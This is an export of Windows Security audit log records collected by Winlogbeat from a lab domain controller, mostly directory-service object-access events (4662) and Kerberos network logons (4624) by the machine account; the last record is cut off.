"May 28, 2026 @ 20:58:12.324"	"8RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D8FD

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x63d8fd	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109784	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.324"	"8BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D8FD

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x63d8fd	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109783	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.321"	"7xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x63D8FD
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.251
	Source Port:		50466

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.251"	50466	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x63d8fd	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109781	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:58:12.221"	"7hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109775	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.221"	"7RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109774	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.221"	"7BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967a00-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967a00-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109773	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.221"	"6xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D870

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x63d870	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109772	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.221"	"6hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D870

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x63d870	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109771	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.220"	"6RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D870

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0x63d870	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109770	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.220"	"6BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.756"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D870

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x63d870	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109769	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.220"	"5xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.756"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D870

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x63d870	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109768	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.216"	"5hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:58:13.756"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x63D870
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
